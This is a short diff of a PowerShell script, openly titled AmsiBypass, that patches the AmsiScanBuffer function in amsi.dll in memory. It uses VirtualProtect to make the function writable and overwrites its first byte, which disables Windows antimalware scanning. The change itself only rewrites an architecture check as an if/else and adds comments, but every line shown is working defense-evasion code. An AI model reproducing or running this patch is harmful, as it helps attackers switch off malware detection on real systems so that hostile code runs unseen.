@@ -15,7 +15,15 @@ Add-Type $s
 
 $a = [AmsiBypass]::LoadLibrary("amsi.dll")
 $b = [AmsiBypass]::GetProcAddress($a, "AmsiScanBuffer")
-$p = [IntPtr]::Size -eq 8 ? 0xC3 : 0x33
+
+# Determine patch value based on architecture
+if ([IntPtr]::Size -eq 8) {
+    $p = 0xC3
+} else {
+    $p = 0x33
+}
+
+# Apply the patch to AMSI
 [void][AmsiBypass]::VirtualProtect($b, [uint32]1, 0x40, [ref]0)
 [System.Runtime.InteropServices.Marshal]::WriteByte($b, $p)
 
